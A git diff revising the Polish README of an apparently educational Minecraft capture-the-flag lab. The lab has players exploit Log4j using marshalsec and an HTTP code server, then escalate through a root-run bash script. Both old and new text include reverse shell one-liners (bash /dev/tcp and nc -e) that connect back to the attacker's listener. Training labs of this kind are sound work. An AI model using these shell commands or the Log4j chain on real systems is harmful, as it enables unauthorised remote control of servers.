@@ -1,99 +1,93 @@
 # minecraft-ctf
 
-- próbujesz uruchomić sklauncher (jak nie masz javy, to se pobierz i zainstaluj)
-- dockera też potrzebujesz (duh)
-- odpalasz docer compose
-- to ci uruchamia 3 kontenery
-- dwa są tak jakby 'twoje', marshaller i httpcode. 'twoje' oznacza, że w topologii realnej są procesami, które ty kontrolujesz i stawiasz na swoim kompie, tutaj są w dockerach, żeby usprawnić całość,
-- twoje zadanie jest następujące: zdobyć flagę wykorzystując podatność Log4j i kilka innych rzeczy :DD
-- w tym celu:
-  1. Uruchom Minecraft:
-     1. Odpalasz SKLauncher, wybierasz tryb ofline,
-     2. Klikasz + po prawej od "Installations Manager",
-     3. Wybierasz release 1.8.8, SAVE, potem PLAY,
-  2. Uruchom server mc (przy okazji inne kontenery):
-     1. W repo komenda: `docker-compose up` albo `docker compose up`, uruchomi ci wszystkie kontenery, m.in. server minecrafta,
-  3. 
-  4. masz za zadanie wykorzystać podatność Log4j,
-  5. kod hostowany na httpcode musisz przygotować i skompilować (kompilacja się dzieje podczas budowania kontenera),
-  6. kod musi ci umożliwić kontrole na serverze
-  7.  musisz znaleźć skrypt bashowy wykonywany z uprawnieniami roota, który możesz zmodyfikować,
-  8.  zmodyfikować go tak, by ...
-  9.  ...
-  10. teraz masz dostęp do pliku z flagą,
-  11. wyślij screen flagi na upela ;D
-  12. udanej zabawy!
+## Wprowadzenie
+Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was! Twoim zadaniem będzie zdobycie flagi, wykorzystując podatność Log4j oraz kilka innych narzędzi, a to wszystko co najlepsze, z użyciem gry, którą chyba każdy zna! Przygotuj się na fascynujące wyzwanie! Owocnego hackowania i udanej zabawy!
 
+## Wymagania
+- Java (jeśli jej nie masz, pobierz i zainstaluj)
+- Docker
+- Minecraft Launcher
+- Jeśli pracujesz na Windowsie, koniecznym może się okazać WSL
+- NetCat (niedostępny na Windowsie, użyj WSL lub zainstaluj osobno)
 
+## Szybki start
+### Uruchamianie SKLauncher
+1. Otwórz SKLauncher, który również znajduje się w repozytorium.
+2. Wybierz tryb offline.
+3. Kliknij '+' obok "Installations Manager".
+4. Wybierz release 1.8.8, zapisz i naciśnij PLAY.
 
-Przydatne rzeczy:
+### Uruchomienie serwera Minecraft i reszty potrzebnych kontenerów
+1. **Uruchom swój serwer Minecraft'a:**
+   - Plik konfiguracyjny kontenera serwera mc znajduje się w katalogu `Minecraft-Log4j-Exploit`.
+   - Po zbudowaniu kontenera i uruchomieniu, w trybie Multiplayer w grze, dodaj serwer pod adresem 127.0.0.1.
 
-Reverse shell:
+2. **Uruchom serwer http:**
+   - Plik konfiguracyjny znajduje się w katalogu `codehttp`.
+
+3. **Uruchom serwer LDAP:**
+   - Dockerfile znajduje się w katalogu `marshalsec`.
+
+<details>
+<summary><b>Informacje o kontenerach</b></summary>
+Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hacker je kontrolujesz. Nienależącym do Ciebie jest ten hostujący serwer Minecraft'a, do którego chcesz uzyskać dostęp. Pozostałe kontenery pomogą Ci w tej misji.
+</details>
+
+## Twoje zadanie
+Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukrytej flagi. Kod hostowany na httpcode musi być przygotowany i skompilowany. Znajdź i zmodyfikuj bashowy skrypt wykonywany z uprawnieniami roota. Jak uzyskasz uprawnienia roota, możesz odnaleźć w plikach kod, który następnie wpiszesz w serwerze Minecrafta. Jeśli kod okaże się poprawny - gratulacje hackerze/ko ;)
+
+## Przydatne informacje
+
+### Reverse Shell
 ```sh
-# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
-
-# odpalasz nasluchiwanie tcp na porcie `5000` na swoim kompie
+# Nasłuchuj na porcie `5000` na swoim komputerze:
 nc -l 5000
 
-# na kompie ofiary na którym możesz uruchomić komendę robisz
-# (musisz wejść w basha - czyli wpisz `bash` w terminal)
-# (w zsh /dev/tcp/[ip]/[port] nie działa )
-bash -i >& /dev/tcp/[ip mojego kompa]/5000 0>&1
-# albo to (ale mi nie działało)
-nc [ip mojego kompa] 5000 –e /bin/bash
-
-
-# Możesz to przetestować robiąc w jednym terminalu
-nc -l 5000
-# a w drugim
-bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
+# Na komputerze ofiary:
+bash -i >& /dev/tcp/[twoje IP]/5000 0>&1
 ```
 
-Zbudowanie i uruchomienie kontenera:
-```bash
-# budowanie obrazu:
+### Budowanie obrazu:
+```sh
+# Stworzenie obrazu kontenera:
 docker build . -t nazwa-obrazu
-docker build . -t nazwa-obrazu:wersja
 
-# uruchomienie obrazu (wtedy mamy uruchomiony kontener)
-docker run -p 25565:25565 -ti 
+# Uruchomienie obrazu z przekierowaniem portów:
+docker run -p 25565:25565 -ti
 ```
 
-EOL:
-```md
-
-VSCode:
-- Minecraft-Log4j-Exploit/server/start_server.sh
-- CTRL + SHIFT + P
-- EOL sequence
-
+### Konfiguracja EOL w VSCode
+```sh
+# Jeśli pracujesz na Windowsie, konieczna może okazać się zmiana EOL - End Of Line:
+- Otwórz `Minecraft-Log4j-Exploit/server/start_server.sh`.
+- Użyj `CTRL + SHIFT + P`.
+- Zmień `EOL sequence`.
 ```
 
+## Przydatne komendy 
 
-Credits:
-https://github.com/Justin-Garey/Minecraft-Log4j-Exploit
-https://github.com/mbechler/marshalsec
-https://lipanski.com/posts/smallest-docker-image-static-website
-
-
-lf w starcie
-odpalic trzy kontenery bez przeszkod
-wejsc na server mc wpisac komende
-
-netcata nie ma na windowsie, trzeba wsl, albo zainstalowac,
-do pliku trzeba dawać to co chcemy uruchomić
-jak zatrzymać bash -c reverse shell?
-echo to wbudowana funkcja basha, a nie żadna binarka 
-
-
-allready allocated port: docker desktop delete container, 
-
+### Docker
+```sh
+docker build
+docker run
 docker ps
 docker ps -a
 docker kill <id>
 docker remove <id>
 docker image prune
 docker container prune
+```
 
-docker build && docker run
-docker kill && docker remove
+## Credits
+- [Minecraft-Log4j-Exploit](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) od Justina Gareya
+- [marshalsec](https://github.com/mbechler/marshalsec) od Marcina Bechlera
+- [Smallest Docker Image Static Website](https://lipanski.com/posts/smallest-docker-image-static-website) od Vladimira Lipanskiego
+- [Mapa Minecraft]() od XXX
+
+
+TODO:
+lf w starcie
+wejsc na server mc wpisac komende
+jak zatrzymać bash -c reverse shell?
+echo to wbudowana funkcja basha, a nie żadna binarka 
+allready allocated port: docker desktop delete container, 
